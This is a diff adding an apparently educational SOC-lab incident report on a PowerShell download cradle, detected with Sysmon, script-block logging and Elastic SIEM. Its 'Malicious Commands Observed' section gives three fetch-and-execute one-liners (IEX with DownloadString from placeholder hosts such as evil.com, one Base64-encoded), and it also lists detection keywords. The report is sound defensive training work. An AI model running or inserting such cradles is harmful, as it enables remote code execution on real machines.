@@ -1,0 +1,225 @@
+# INCIDENT INVESTIGATION REPORT: POWERSHELL DOWNLOAD CRADLE
+
+| Field            | Value                                                     |
+| ---------------- | --------------------------------------------------------- |
+| **Date**         | 5/5/2026                                                  |
+| **Analyst**      | Benjamin Ainley-Zoll                                      |
+| **Severity**     | HIGH                                                      |
+| **Status**       | CONTAINED (Lab Environment)                               |
+| **MITRE ATT&CK** | T1059.001 - Command and Scripting Interpreter: PowerShell |
+
+---
+
+# Executive Summary
+
+A malicious PowerShell download cradle attack was detected involving the execution of encoded and obfuscated PowerShell commands designed to retrieve remote payloads from external URLs.
+
+The attack was identified through PowerShell Script Block Logging and Sysmon process creation events collected within the Elastic Stack SIEM environment. Detection rules successfully identified suspicious use of `Net.WebClient`, `IEX`, and Base64-encoded PowerShell execution.
+
+---
+
+# Technical Details
+
+## Attack Information
+
+| Attribute             | Value                               |
+| --------------------- | ----------------------------------- |
+| **Attack Type**       | PowerShell Download Cradle          |
+| **Execution Method**  | Encoded PowerShell Command          |
+| **Target System**     | Windows 10                          |
+| **Detection Source**  | PowerShell Logging + Sysmon         |
+| **Collection Method** | Winlogbeat → Elasticsearch → Kibana |
+
+---
+
+# Timeline of Events
+
+| Time     | Activity                                          |
+| -------- | ------------------------------------------------- |
+| 15:02:11 | `powershell.exe` process launched                 |
+| 15:02:13 | Encoded PowerShell command executed               |
+| 15:02:14 | Remote payload download attempt observed          |
+| 15:02:15 | Script block logging captured suspicious activity |
+| 15:02:16 | SIEM alert triggered in Kibana                    |
+| 15:02:40 | Investigation initiated                           |
+
+---
+
+# Indicators of Compromise (IOCs)
+
+## Process Indicators
+
+| Indicator          | Value                   |
+| ------------------ | ----------------------- |
+| **Process Name**   | powershell.exe          |
+| **Execution Type** | EncodedCommand          |
+| **Parent Process** | cmd.exe                 |
+| **Technique**      | Remote Script Execution |
+
+---
+
+## Behavioral Indicators
+
+| Indicator               | Value                               |
+| ----------------------- | ----------------------------------- |
+| **Event ID**            | 4104 (Script Block Logging)         |
+| **Suspicious Function** | `Net.WebClient`                     |
+| **Execution Method**    | `IEX` (Invoke-Expression)           |
+| **Obfuscation**         | Base64 Encoded Command              |
+| **Network Activity**    | External PowerShell Script Download |
+
+---
+
+# Malicious Commands Observed
+
+## Encoded PowerShell Execution
+
+```powershell id="d4u8qa"
+$command = 'IEX (New-Object Net.WebClient).DownloadString("http://bad.com/shell.ps1")'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -EncodedCommand $encodedCommand
+```
+
+---
+
+## Direct Download Cradle
+
+```powershell id="n8u1jk"
+IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
+```
+
+---
+
+## Obfuscated PowerShell Execution
+
+```powershell id="d8f6mx"
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
+```
+
+---
+
+# Detection Methodology
+
+## Data Sources
+
+* PowerShell Script Block Logging (Event ID 4104)
+* Sysmon Event ID 1 (Process Creation)
+* Winlogbeat Log Collection
+* Kibana SIEM Correlation Rules
+
+---
+
+## Detection Query
+
+```kql id="4kqf7g"
+event.code: 4104 AND
+powershell.file.script_block_text: *DownloadString*
+```
+
+---
+
+## Detection Logic
+
+The detection rule monitors for suspicious PowerShell behavior commonly associated with malware delivery and command execution.
+
+Key indicators included:
+
+* `IEX` (Invoke-Expression)
+* `Net.WebClient`
+* `DownloadString`
+* Encoded PowerShell execution
+* `-nop` execution flag
+
+These techniques are frequently used by attackers to execute payloads directly in memory while avoiding traditional file-based detection.
+
+---
+
+# Investigation Findings
+
+## Observed Activity
+
+* PowerShell executed with encoded commands
+* External HTTP payload retrieval attempted
+* Obfuscated execution techniques observed
+* Script block logging successfully captured commands
+* SIEM alert triggered immediately after execution
+
+---
+
+# Response Actions
+
+## Containment
+
+* PowerShell process terminated
+* Network access restricted within lab
+* Malicious scripts removed
+
+## Eradication
+
+* Encoded commands analyzed and documented
+* PowerShell history reviewed
+* Logs archived for investigation
+
+## Recovery
+
+* Verified no persistence mechanisms existed
+* Confirmed no secondary payloads executed
+* Monitoring continued after containment
+
+---
+
+# Recommendations
+
+## Immediate Improvements
+
+* Enable PowerShell Constrained Language Mode
+* Restrict PowerShell for standard users
+* Block outbound traffic to untrusted domains
+* Enable AMSI integration
+
+---
+
+## Long-Term Security Enhancements
+
+* Deploy EDR with PowerShell monitoring
+* Monitor for Base64 encoded commands
+* Alert on `IEX` and `DownloadString` usage
+* Expand SIEM coverage for PowerShell abuse techniques
+
+---
+
+# MITRE ATT&CK Mapping
+
+| Tactic              | Technique             | ID        |
+| ------------------- | --------------------- | --------- |
+| Execution           | PowerShell            | T1059.001 |
+| Command and Control | Ingress Tool Transfer | T1105     |
+
+---
+
+# Evidence Collected
+
+* PowerShell Script Block logs
+* Sysmon process creation logs
+* Kibana alert screenshots
+* Encoded command artifacts
+
+---
+
+# Conclusion
+
+The SOC lab successfully detected malicious PowerShell download cradle activity involving encoded and obfuscated command execution.
+
+The investigation demonstrated effective detection of attacker tradecraft using PowerShell logging, Sysmon telemetry, and Elastic Stack correlation rules.
+
+---
+
+# Report Metadata
+
+| Field              | Value                         |
+| ------------------ | ----------------------------- |
+| **Prepared By**    | Benjamin Ainley-Zoll          |
+| **Report Version** | 1.0                           |
+| **Classification** | Educational / Lab Environment |
+| **Environment**    | Isolated SOC Lab              |
